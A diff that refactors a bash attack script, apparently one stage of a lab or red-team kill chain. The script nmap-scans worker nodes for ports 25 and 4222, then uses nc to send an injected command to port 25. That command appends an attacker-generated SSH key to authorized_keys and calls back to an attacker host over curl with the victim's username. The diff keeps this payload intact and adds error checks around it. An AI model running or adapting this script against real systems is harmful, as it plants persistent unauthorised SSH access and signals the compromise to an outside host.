@@ -4,38 +4,24 @@ set -euo pipefail
 FILE_IP="/tmp/iphost"
 KEY_PATH="$HOME/.ssh/id_ed25519"
 FILEATTACK="$DATA_PATH/KC4/attackaddr"
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+NODE_IP_HELPER="${SCRIPT_DIR}/../common/list-node-ips.sh"
 
-mkdir -p $DATA_PATH/KC4/analysis
+[[ -f "${NODE_IP_HELPER}" ]] || { echo "Missing helper: ${NODE_IP_HELPER}" >&2; exit 1; }
+# shellcheck source=../common/list-node-ips.sh
+source "${NODE_IP_HELPER}"
 
-list_node_ips() {
-  if [[ ! -f "$FILE_IP" ]]; then
-    echo "Error: file '$FILE_IP' not found" >&2
-    return 1
-  fi
-
-  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
-  awk -F'-' '
-    /^[[:space:]]*#/ { next }
-    /^[[:space:]]*$/ { next }
-    NF >= 2 {
-      ip=$1; host=$2
-      gsub(/^[ \t]+|[ \t\r]+$/, "", ip)
-      gsub(/^[ \t]+|[ \t\r]+$/, "", host)
-      if (host ~ /^worker([0-9]+)?$/ && ip ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {
-        print ip
-      }
-    }
-  ' "$FILE_IP" | sort -u
-}
-
-mapfile -t nodes < <(list_node_ips | sed '/^$/d')
+mkdir -p "$DATA_PATH/KC4/analysis"
+mapfile -t nodes < <(list_worker_node_ips "$FILE_IP" | sed '/^$/d')
 if [[ "${#nodes[@]}" -eq 0 ]]; then
-  echo "No node found"; exit 1
+  echo "No node found"
+  exit 1
 fi
 echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
 
+ATTACKER_NODE=""
 for n in "${nodes[@]}"; do
-  out=$(nmap -p 25,4222 -Pn -oG - "$n" 2>/dev/null)
+  out="$(nmap -p 25,4222 -Pn -oG - "$n" 2>/dev/null)"
   # Check both ports reported as open in nmap greppable output
   if echo "$out" | grep -q '25/open' && echo "$out" | grep -q '4222/open'; then
     echo "FOUND: $n (ports 25 and 4222 are open)"
@@ -45,5 +31,10 @@ for n in "${nodes[@]}"; do
   fi
 done
 
-ssh-keygen -t ed25519 -N "" -f $KEY_PATH -q
-echo -n "echo \"$(cat $KEY_PATH.pub)\" >> ~/.ssh/authorized_keys && curl http://$ATTACKERADDR:8080/\$(id -un)" | nc -w9 $ATTACKER_NODE 25 > /dev/null 2>&1
+[[ -n "${ATTACKER_NODE}" ]] || { echo "No worker node with both ports 25 and 4222 open." >&2; exit 1; }
+command -v ssh-keygen >/dev/null 2>&1 || { echo "Missing command: ssh-keygen" >&2; exit 1; }
+command -v nc >/dev/null 2>&1 || { echo "Missing command: nc" >&2; exit 1; }
+mkdir -p "$(dirname "$KEY_PATH")"
+ssh-keygen -t ed25519 -N "" -f "$KEY_PATH" -q
+echo -n "echo \"$(cat "$KEY_PATH.pub")\" >> ~/.ssh/authorized_keys && curl http://$ATTACKERADDR:8080/\$(id -un)" \
+  | nc -w9 "$ATTACKER_NODE" 25 >/dev/null 2>&1
